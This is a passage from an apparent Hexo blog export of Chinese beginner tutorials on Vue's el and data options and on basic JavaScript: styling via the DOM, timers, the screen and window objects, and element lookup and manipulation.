<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">"app"</span>&gt;</span></span><br><span class="line">    &#123;&#123; message&#125;&#125;</span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure>



</li>
</ul>
<ul>
<li><p>选择器的类型：不限于id选择器，下面的三个都是可以的</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"app"</span>&gt;</span></span><br><span class="line">        &#123;&#123; message&#125;&#125;</span><br><span class="line">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- 导包 --&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- 开发环境版本，包含了有帮助的命令行警告 --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"https://cdn.jsdelivr.net/npm/vue/dist/vue.js"</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="actionscript">        <span class="keyword">var</span> app = <span class="keyword">new</span> Vue(&#123;</span></span><br><span class="line"><span class="actionscript">            <span class="comment">// 注意看这里</span></span></span><br><span class="line"><span class="actionscript">            el: <span class="string">".app"</span>,</span></span><br><span class="line">            data: &#123;</span><br><span class="line"><span class="actionscript">                message: <span class="string">"你好"</span>,</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">    <span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br></pre></td></tr></table></figure>

<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span>&gt;</span></span><br><span class="line">        &#123;&#123; message&#125;&#125;</span><br><span class="line">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- 导包 --&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- 开发环境版本，包含了有帮助的命令行警告 --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"https://cdn.jsdelivr.net/npm/vue/dist/vue.js"</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="actionscript">        <span class="keyword">var</span> app = <span class="keyword">new</span> Vue(&#123;</span></span><br><span class="line"><span class="actionscript">            <span class="comment">// 注意看这里</span></span></span><br><span class="line"><span class="actionscript">            el: <span class="string">"div"</span>,</span></span><br><span class="line">            data: &#123;</span><br><span class="line"><span class="actionscript">                message: <span class="string">"你好"</span>,</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">    <span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br></pre></td></tr></table></figure>

<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- 注意看这里 --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">p</span> <span class="attr">id</span>=<span class="string">"app"</span>&gt;</span></span><br><span class="line">        &#123;&#123; message&#125;&#125;</span><br><span class="line">    <span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- 导包 --&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- 开发环境版本，包含了有帮助的命令行警告 --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"https://cdn.jsdelivr.net/npm/vue/dist/vue.js"</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="actionscript">        <span class="keyword">var</span> app = <span class="keyword">new</span> Vue(&#123;</span></span><br><span class="line"><span class="actionscript">            <span class="comment">// 注意看这里</span></span></span><br><span class="line"><span class="actionscript">            el: <span class="string">"#app"</span>,</span></span><br><span class="line">            data: &#123;</span><br><span class="line"><span class="actionscript">                message: <span class="string">"你好"</span>,</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">    <span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p><strong>值得注意的是，el不能够挂载到单标签和body标签中</strong>，建议使用id选择器和挂载到div中。</p>
</li>
</ul>
<h2 id="date数据对象"><a href="#date数据对象" class="headerlink" title="date数据对象"></a>date数据对象</h2><ul>
<li><p>Vue中用到的数据定义在data中</p>
</li>
<li><p>data中的数据类型不限于字符串，还可以是复杂的数据类型，如对象，数组</p>
</li>
<li><p>渲染复杂类型数据时，遵守js的语法即可，如</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">data: &#123;</span><br><span class="line">    message: <span class="string">"你好"</span>,</span><br><span class="line">    student: &#123;</span><br><span class="line">        name: <span class="string">"YaleXin"</span>,</span><br><span class="line">        age: <span class="number">20</span>,</span><br><span class="line">        address: <span class="string">"earth"</span>,</span><br><span class="line">    &#125;,</span><br><span class="line">    test_array: [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>],</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>引用时加上双大括号即可</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">"app"</span>&gt;</span></span><br><span class="line">    &#123;&#123; message &#125;&#125;</span><br><span class="line">    &#123;&#123;student.name&#125;&#125;</span><br><span class="line">    <span class="tag">&lt;<span class="name">ol</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">li</span>&gt;</span>&#123;&#123;test_array[0]&#125;&#125;<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">li</span>&gt;</span>&#123;&#123;test_array[2]&#125;&#125;<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">ol</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure>



</li>
</ul>
<p>  <img src="http://q78fmp2j4.bkt.clouddn.com/blog/20200316/akfBfVATnbor.png" alt></p>
]]></content>
      <categories>
        <category>Vue初级</category>
      </categories>
      <tags>
        <tag>Vue</tag>
      </tags>
  </entry>
  <entry>
    <title>JavaScript语法三</title>
    <url>/2020/03/16/JavaScript%E8%AF%AD%E6%B3%95%E4%B8%89/</url>
    <content><![CDATA[<h2 id="js对象控制CSS"><a href="#js对象控制CSS" class="headerlink" title="js对象控制CSS"></a>js对象控制CSS</h2><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">"zh"</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">"UTF-8"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">"viewport"</span> <span class="attr">content</span>=<span class="string">"width=device-width, initial-scale=1.0"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">"X-UA-Compatible"</span> <span class="attr">content</span>=<span class="string">"ie=edge"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>Document<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">style</span> <span class="attr">type</span>=<span class="string">"text/css"</span>&gt;</span></span><br><span class="line">        p &#123;</span><br><span class="line">            color: brown;</span><br><span class="line">            width: fit-content;</span><br><span class="line">            height: auto;</span><br><span class="line">            background-color: aquamarine;</span><br><span class="line">        &#125;</span><br><span class="line">    <span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">p</span> <span class="attr">id</span>=<span class="string">"p_id"</span>&gt;</span>这是一段测试的文字<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">button</span> <span class="attr">onclick</span>=<span class="string">"change()"</span>&gt;</span>改变背景颜色<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="actionscript">        <span class="function"><span class="keyword">function</span> <span class="title">change</span><span class="params">()</span> </span>&#123;</span></span><br><span class="line"><span class="javascript">            <span class="built_in">document</span>.getElementById(<span class="string">"p_id"</span>).style.backgroundColor = <span class="string">"#ffffff"</span>;</span></span><br><span class="line">        &#125;</span><br><span class="line">    <span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>

<a id="more"></a>

<p>其他的效果类似，方法都是先找到要改变的元素，然后设置新的CSS样式。</p>
<h2 id="计时器"><a href="#计时器" class="headerlink" title="计时器"></a>计时器</h2><h3 id="1-计时事件"><a href="#1-计时事件" class="headerlink" title="1.计时事件"></a>1.计时事件</h3><p>通过JavaScript，我们可以在一个需要的时间间隔之后执行我们的任务，而不是在函数被调用后立即执行，我们称之为计时事件。</p>
<h3 id="2-计时方法"><a href="#2-计时方法" class="headerlink" title="2.计时方法"></a>2.计时方法</h3><ol>
<li><p>setInterval(code,millisec[,”lang”])：间隔指定的毫秒数不停地执行指定的代码</p>
<table>
<thead>
<tr>
<th align="left">参数</th>
<th align="left">描述</th>
</tr>
</thead>
<tbody><tr>
<td align="left">code</td>
<td align="left">必需。要调用的函数或要执行的代码串。</td>
</tr>
<tr>
<td align="left">millisec</td>
<td align="left">必须。周期性执行或调用 code 之间的时间间隔，以毫秒计。</td>
</tr>
</tbody></table>
<p>例如：</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">p</span> <span class="attr">id</span>=<span class="string">"time_p"</span>&gt;</span><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="actionscript">    <span class="keyword">var</span> demo_time = setInterval( <span class="string">"getTime()"</span>,<span class="number">1000</span>);</span></span><br><span class="line"><span class="actionscript">    <span class="function"><span class="keyword">function</span> <span class="title">getTime</span><span class="params">()</span></span>&#123;</span></span><br><span class="line"><span class="javascript">        <span class="keyword">var</span> nowDate = <span class="keyword">new</span> <span class="built_in">Date</span>();</span></span><br><span class="line"><span class="actionscript">        <span class="keyword">var</span> nowTime = nowDate.toLocaleTimeString();</span></span><br><span class="line"><span class="javascript">        <span class="built_in">document</span>.getElementById(<span class="string">"time_p"</span>).innerHTML = nowTime;</span></span><br><span class="line">    &#125;</span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>那我们想要停止执行怎么办？用下面这个方法就可以了</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">clearInterval(demo_time);</span><br></pre></td></tr></table></figure>
</li>
<li><p>setTimeout(code,millisec[,”lang”])：延迟指定的毫秒数后执行指定的代码   </p>
<p>例如</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> demo_time = setTimeout( <span class="string">"getTime()"</span>,<span class="number">1000</span>);<span class="comment">//一秒后执行一次getTime()</span></span><br></pre></td></tr></table></figure>

<p>虽然说是执行一次，但是我们可以利用递归进行不断调用，从而实现setInterval()类似的效果，如</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">p</span> <span class="attr">id</span>=<span class="string">"time_p"</span>&gt;</span><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">button</span> <span class="attr">onclick</span>=<span class="string">"stop_time()"</span>&gt;</span>停止计时<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="actionscript">    <span class="keyword">var</span> demo_time;</span></span><br><span class="line"><span class="actionscript">    <span class="function"><span class="keyword">function</span> <span class="title">getTime</span><span class="params">()</span></span>&#123;</span></span><br><span class="line"><span class="javascript">        <span class="keyword">var</span> nowDate = <span class="keyword">new</span> <span class="built_in">Date</span>();</span></span><br><span class="line"><span class="actionscript">        <span class="keyword">var</span> nowTime = nowDate.toLocaleTimeString();</span></span><br><span class="line"><span class="javascript">        <span class="built_in">document</span>.getElementById(<span class="string">"time_p"</span>).innerHTML = nowTime;</span></span><br><span class="line"><span class="actionscript">        demo_time = setTimeout( <span class="string">"getTime()"</span>,<span class="number">3000</span>);</span></span><br><span class="line">    &#125;</span><br><span class="line"><span class="actionscript">    <span class="function"><span class="keyword">function</span> <span class="title">stop_time</span><span class="params">()</span></span>&#123;</span></span><br><span class="line">        clearTimeout(demo_time);</span><br><span class="line">    &#125;</span><br><span class="line">    getTime();</span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>但是”可以“并不代表着推荐这么做，想想调用函数的本质是什么？不就是压栈吗？我们永不断地进行压栈，而没有弹栈，计算机的资源不久就会被消耗殆尽。因此，对于周期性的工作，我们还是 强烈推荐使用setInterval()方法。</p>
</li>
</ol>
<h2 id="利用screen对象获取屏幕信息"><a href="#利用screen对象获取屏幕信息" class="headerlink" title="利用screen对象获取屏幕信息"></a>利用screen对象获取屏幕信息</h2><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="actionscript">    <span class="keyword">var</span> a_height = screen.availHeight;</span></span><br><span class="line"><span class="actionscript">    <span class="keyword">var</span> a_width = screen.availWidth;</span></span><br><span class="line"><span class="actionscript">    <span class="keyword">var</span> height = screen.height;</span></span><br><span class="line"><span class="actionscript">    <span class="keyword">var</span> width = screen.width;</span></span><br><span class="line"><span class="javascript">    <span class="built_in">console</span>.log(<span class="string">"可用的屏幕高度："</span>+a_height</span></span><br><span class="line"><span class="actionscript">                +<span class="string">"\n可用的屏幕宽度："</span>+a_width</span></span><br><span class="line"><span class="actionscript">                +<span class="string">"\n屏幕的高度："</span>+height</span></span><br><span class="line"><span class="actionscript">                +<span class="string">"\n屏幕的宽度："</span>+width);</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>Web基础</category>
      </categories>
      <tags>
        <tag>JavaScript基础</tag>
      </tags>
  </entry>
  <entry>
    <title>JavaScript语法二</title>
    <url>/2020/03/15/JavaScript%E8%AF%AD%E6%B3%95%E4%BA%8C/</url>
    <content><![CDATA[<h2 id="window对象"><a href="#window对象" class="headerlink" title="window对象"></a>window对象</h2><ul>
<li><p>window对象是BOM的核心，window对象指当前的浏览器窗口</p>
</li>
<li><p>所有JavaScript全局对象、函数以及变量均自动成为window对象的成员</p>
</li>
<li><p>全局变量是window对象的属性</p>
</li>
<li><p>全局函数是window对象的方法<a id="more"></a></p>
</li>
<li><p>甚至HTML DOM的document也是window对象的属性之一</p>
</li>
<li><p>window.innerHeight ：浏览器窗口的内部高度</p>
</li>
<li><p>window.innerWidth ：浏览器窗口的内部宽度</p>
</li>
<li><p>打开一个window窗口:windows.open()</p>
</li>
</ul>
<table>
<thead>
<tr>
<th align="left">参数</th>
<th align="left">描述</th>
</tr>
</thead>
<tbody><tr>
<td align="left">URL</td>
<td align="left">一个可选的字符串，声明了要在新窗口中显示的文档的 URL。如果省略了这个参数，或者它的值是空字符串，那么新窗口就不会显示任何文档。</td>
</tr>
<tr>
<td align="left">name</td>
<td align="left">一个可选的字符串，该字符串是一个由逗号分隔的特征列表，其中包括数字、字母和下划线，该字符声明了新窗口的名称。如果该参数指定了一个已经存在的窗口，那么 open() 方法就不再创建一个新窗口，而只是返回对指定窗口的引用。在这种情况下，features 将被忽略。</td>
</tr>
<tr>
<td align="left">features</td>
<td align="left">一个可选的字符串，声明了新窗口要显示的标准浏览器的特征。如果省略该参数，新窗口将具有所有标准特征。在<a href="https://www.w3school.com.cn/jsref/met_win_open.asp#windowfeatures" target="_blank" rel="noopener">窗口特征</a>这个表格中，我们对该字符串的格式进行了详细的说明。</td>
</tr>
<tr>
<td align="left">replace</td>
<td align="left">一个可选的布尔值。规定了装载到窗口的 URL 是在窗口的浏览历史中创建一个新条目，还是替换浏览历史中的当前条目。支持下面的值：<br>true - URL 替换浏览历史中的当前条目。<br>false - URL 在浏览历史中创建新的条目。</td>
</tr>
</tbody></table>
<ul>
<li><p>关闭一个window窗口:windows.close()</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">"text/javascript"</span>&gt;</span></span><br><span class="line"><span class="actionscript">        <span class="function"><span class="keyword">function</span> <span class="title">closeWin</span><span class="params">()</span> </span>&#123;</span></span><br><span class="line">            myWindow.close()</span><br><span class="line">        &#125;</span><br><span class="line">    <span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">"text/javascript"</span>&gt;</span></span><br><span class="line"><span class="javascript">        myWindow = <span class="built_in">window</span>.open(<span class="string">''</span>, <span class="string">''</span>, <span class="string">'width=200,height=100'</span>)</span></span><br><span class="line"><span class="actionscript">        myWindow.document.write(<span class="string">"This is 'myWindow'"</span>)</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"button"</span> <span class="attr">value</span>=<span class="string">"Close 'myWindow'"</span> <span class="attr">onclick</span>=<span class="string">"closeWin()"</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>当然了，如果想要通过打开一个窗口的方式来打开一个链接URL，是不推荐的，因为有些浏览器为了安全起见，可能会阻止windows.open()打开一个URL。</p>
<p><img src="http://q78fmp2j4.bkt.clouddn.com/blog/20200315/upP0Jok6i6zX.png" alt></p>
</li>
</ul>
<h2 id="js对象控制HTML元素"><a href="#js对象控制HTML元素" class="headerlink" title="js对象控制HTML元素"></a>js对象控制HTML元素</h2><p>想要要控制元素，首先就要先得到，或者说找到该元素，通过以下不同的几个不同的方法，可以得到或者控制HTML元素。</p>
<table>
<thead>
<tr>
<th>方法名</th>
<th>方法描述</th>
</tr>
</thead>
<tbody><tr>
<td>document.getElementsByTagName()</td>
<td>返回带有指定标签名的对象的集合。</td>
</tr>
<tr>
<td>document.getElementById()</td>
<td>返回对拥有指定 ID 的第一个对象的引用。</td>
</tr>
<tr>
<td>document.getElementsByName()</td>
<td>返回带有指定名称的对象的集合。</td>
</tr>
<tr>
<td>node_name.getAttribute()</td>
<td>返回指定属性名的属性值。</td>
</tr>
<tr>
<td>node_name.setAttribute()</td>
<td>添加指定的属性，并为其赋指定的值。<br>如果这个指定的属性已存在，则仅设置/更改值。</td>
</tr>
<tr>
<td>node_name.childNodes</td>
<td>返回节点的子节点集合，以 NodeList 对象。</td>
</tr>
<tr>
<td>node_name.parentNode</td>
<td>以 Node 对象的形式返回指定节点的父节点</td>
</tr>
<tr>
<td>document.createElement()</td>
<td>通过指定名称创建一个元素</td>
</tr>
<tr>
<td>node_name.removeChild()</td>
<td>删除当前节点下的特定子节点</td>
</tr>
</tbody></table>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">p</span> <span class="attr">name</span>=<span class="string">"p_name"</span>&gt;</span>1<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">p</span> <span class="attr">name</span>=<span class="string">"p_name"</span>&gt;</span>2<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">p</span> <span class="attr">name</span>=<span class="string">"p_name"</span>&gt;</span>3<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">p</span> <span class="attr">name</span>=<span class="string">"p_name"</span>&gt;</span>4<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">a</span> <span class="attr">id</span>=<span class="string">"a_id"</span> <span class="attr">href</span>=<span class="string">"https://yalexin.gitee.io/"</span>&gt;</span>博客<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">"div"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">p</span> <span class="attr">name</span>=<span class="string">"p_name"</span> <span class="attr">id</span>=<span class="string">"p_5"</span>&gt;</span>5<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">p</span> <span class="attr">name</span>=<span class="string">"p_name"</span>&gt;</span>6<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="actionscript">        <span class="function"><span class="keyword">function</span> <span class="title">demo</span><span class="params">()</span> </span>&#123;</span></span><br><span class="line"><span class="javascript">            <span class="keyword">var</span> p_count = <span class="built_in">document</span>.getElementsByTagName(<span class="string">"p"</span>);</span></span><br><span class="line"><span class="javascript">            <span class="keyword">var</span> n_count = <span class="built_in">document</span>.getElementsByName(<span class="string">"p_name"</span>);</span></span><br><span class="line"><span class="actionscript">            <span class="comment">// print:HTMLCollection(4)</span></span></span><br><span class="line"><span class="javascript">            <span class="built_in">console</span>.log(p_count);</span></span><br><span class="line"><span class="actionscript">            <span class="comment">//通过下标访问集合中的元素</span></span></span><br><span class="line"><span class="javascript">            <span class="built_in">console</span>.log(n_count[<span class="number">1</span>].innerHTML);</span></span><br><span class="line"><span class="actionscript">            <span class="comment">// 通过id得到元素</span></span></span><br><span class="line"><span class="javascript">            <span class="keyword">var</span> a = <span class="built_in">document</span>.getElementById(<span class="string">"a_id"</span>);</span></span><br><span class="line"><span class="actionscript">            <span class="comment">// 查找元素的属性</span></span></span><br><span class="line"><span class="javascript">            <span class="built_in">console</span>.log(a.getAttribute(<span class="string">"href"</span>));</span></span><br><span class="line"><span class="actionscript">            <span class="comment">// 设置新的属性值</span></span></span><br><span class="line"><span class="actionscript">            a.setAttribute(<span class="string">"href"</span>, <span class="string">"https://yalexin.gitee.io/guestbook/"</span>);</span></span><br><span class="line"><span class="javascript">            <span class="keyword">var</span> div = <span class="built_in">document</span>.getElementById(<span class="string">"div"</span>);</span></span><br><span class="line"><span class="actionscript">            <span class="comment">// 得到子节点集合</span></span></span><br><span class="line"><span class="actionscript">            <span class="keyword">var</span> child_list = div.childNodes;</span></span><br><span class="line"><span class="javascript">            <span class="keyword">var</span> p = <span class="built_in">document</span>.getElementById(<span class="string">"p_5"</span>);</span></span><br><span class="line"><span class="actionscript">            <span class="comment">//得到父节点（只有一个）</span></span></span><br><span class="line"><span class="actionscript">            <span class="keyword">var</span> parent = p.parentNode;</span></span><br><span class="line"><span class="javascript">            <span class="keyword">var</span> body = <span class="built_in">document</span>.body;</span></span><br><span class="line"><span class="actionscript">            <span class="comment">//创建一个输入框节点</span></span></span><br><span class="line"><span class="javascript">            <span class="keyword">var</span> input = <span class="built_in">document</span>.createElement(<span class="string">"input"</span>);</span></span><br><span class="line"><span class="actionscript">            input.type = <span class="string">"text"</span>;</span></span><br><span class="line"><span class="actionscript">            input.placeholder = <span class="string">"这是通过createElement方法创建的"</span>;</span></span><br><span class="line"><span class="actionscript">            <span class="comment">// 将input添加到body中（在末尾）</span></span></span><br><span class="line">            body.appendChild(input);</span><br><span class="line"><span class="javascript">            <span class="keyword">var</span> p_insert = <span class="built_in">document</span>.createElement(<span class="string">"p"</span>);</span></span><br><span class="line"><span class="actionscript">            p_insert.innerHTML = <span class="string">"这是通过insert方法插入的"</span>;</span></span><br><span class="line"><span class="actionscript">            <span class="comment">// 将p_insert节点插入到p节点之前（id = p_5）</span></span></span><br><span class="line">            div.insertBefore(p_insert, p);</span><br><span class="line"><span class="actionscript">            <span class="comment">// 删除div的子节点p（id = p_5）</span></span></span><br><span class="line">            div.removeChild(p);</span><br><span class="line">        &#125;</span><br><span class="line">        demo();</span><br><span class="line">    <span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h2 id><a href="#" class="headerlink" title></a></h2>]]></content>
      <categories>
        <category>Web基础</category>
      </categories>
      <tags>
        <tag>JavaScript基础</tag>
      </tags>
  </entry>
  <entry>
    <title>JavaScript语法一</title>
    <url>/2020/03/09/JavaScript%E8%AF%AD%E6%B3%95%E4%B8%80/</url>
    <content><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p> JavaScript 是一种脚本，一门编程语言，它可以在网页上实现复杂的功能，网页展现给你的不再是简单的静态信息，而是实时的内容更新，交互式的地图，2D/3D 动画，滚动播放的视频等等。构建web前端，JavaScript 怎能缺席。它是标准 Web 技术蛋糕的第三层，其中 <a href="https://ruixin_huang.gitee.io/mblog/2020/03/07/html%E8%AF%AD%E6%B3%951/" target="_blank" rel="noopener">HTML </a>和 <a href="https://ruixin_huang.gitee.io/mblog/2020/03/08/css-%E8%AF%AD%E6%B3%95/" target="_blank" rel="noopener">CSS </a>我们已经在前面有了初步学习。</p>
<h2 id="使用方法"><a href="#使用方法" class="headerlink" title="使用方法"></a>使用方法</h2><p>前面学习CSS中，我们知道CSS的使用方法有三种：元素内嵌、文档内嵌、导入外部。这里的JavaScript也有类似的方法：元素内嵌、文档内嵌、导入外部：</p>
<a id="more"></a>

<ul>
<li><p>元素内嵌</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"button"</span> <span class="attr">value</span>=<span class="string">"这是一个按钮"</span> <span class="attr">onclick</span>=<span class="string">"alert('你好')"</span>&gt;</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>文档内嵌</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">"UTF-8"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">"viewport"</span> <span class="attr">content</span>=<span class="string">"width=device-width, initial-scale=1.0"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">"X-UA-Compatible"</span> <span class="attr">content</span>=<span class="string">"ie=edge"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>Document<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="actionscript">        alert(<span class="string">"hello world"</span>);</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>导入外部</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">//新建一个test.js</span></span><br><span class="line">alert(<span class="string">"test"</span>);</span><br><span class="line"><span class="comment">//在HTML文件中的head标签下引入</span></span><br><span class="line">&lt;script src=<span class="string">"test.js"</span>&gt;&lt;<span class="regexp">/script&gt;</span></span><br></pre></td></tr></table></figure>

</li>
</ul>
